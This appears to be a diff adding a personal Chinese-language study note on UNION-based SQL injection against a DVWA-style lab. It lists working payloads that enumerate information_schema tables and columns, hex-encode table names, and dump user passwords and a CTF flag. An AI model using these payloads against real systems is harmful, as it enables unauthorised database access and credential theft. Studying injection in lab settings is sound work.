@@ -1,0 +1,77 @@
+字符型注入、数字型注入
+
+database() 数据库名
+
+
+—————— 表名
+
+1' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; #
+
+————如果limit 1 我们可以用 offset 1 偏移
+
+1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; #
+
+select * from news where id=1234234 UNION SELECT 2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; #  ———————— 可用，查出了所有表
+
+select * from news where id=1234234 UNION SELECT 2,GROUP_CONCAT(table_name) FROM information_schema.tables; #
+
+select * from news where id=1234234 UNION select database(),2
+
+UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   #
+
+SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
+
+UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
+
+tablename: users | guestbook
+
+UNION SELECT TABLE_NAME (是否加 ,1) FROM information_schema.tables WHERE TABLE_SCHEMA=database();
+
+————union 特性注意  or 1=1 用途注意
+
+test: UNION SELECT TABLE_NAME,1 FROM information_schema.tables WHERE TABLE_SCHEMA=database();  ---可用
+
+—————— 列名
+
+UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
+
+id=1 UNION SELECT GROUP_CONCAT(column_name) ____注意union的参数数量 FROM information_schema.columns WHERE table_name = 'guestbook' #
+
+1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #   ----- 进制转换后name这里都不需要引号吗
+
+1' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #
+
+0x6775657374626f6f6b
+
+1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6775657374626f6f6b #
+
+—————— 数据
+
+
+1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+
+1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+
+1 union select group_concat(flag),3 from flag#
+
+参考一下：———— https://www.cnblogs.com/yaolingyu/p/17231624.html
+
+
+常用sql注入词汇
+
+information_schema
+
+schemata(schema_name)
+
+tables(table_schema,table_name)
+
+columns(table_schema,table_name,column_name)
+
+select schema_name from information_schema.schemata;
+
+select table_name from information_schema.tables where table_schema='dvwa';
+
+select column_name from information_schema.columns where table_name='users' and table_schema='dvwa';
+
+select concat(username,password) from dvwa.users;
+
